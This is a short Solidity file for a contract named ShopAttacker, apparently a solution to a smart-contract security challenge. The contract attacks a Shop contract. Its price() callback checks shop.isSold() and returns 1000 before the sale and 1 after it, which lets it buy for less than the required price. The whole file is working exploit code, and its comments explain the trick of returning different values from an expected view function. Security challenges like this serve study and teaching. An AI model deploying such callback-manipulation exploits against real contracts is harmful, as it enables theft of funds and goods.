// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.18;

/**
 * @title Shop Attacker
 * @dev This contract is used to attack the Shop contract
 */
contract ShopAttacker {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function buyForLess() external {
        shop.buy();
    }

    // The key insight is this is called twice - the first time, return over 100, the second time under
    function price() external returns (uint256) {
        // but with a view function, it doesn't actually have to be a view right
        if (shop.isSold()) {
            return 1;
        } else {
            return 1000;
        }
    }
}

interface Shop {
    function buy() external;

    function isSold() external returns (bool);
}
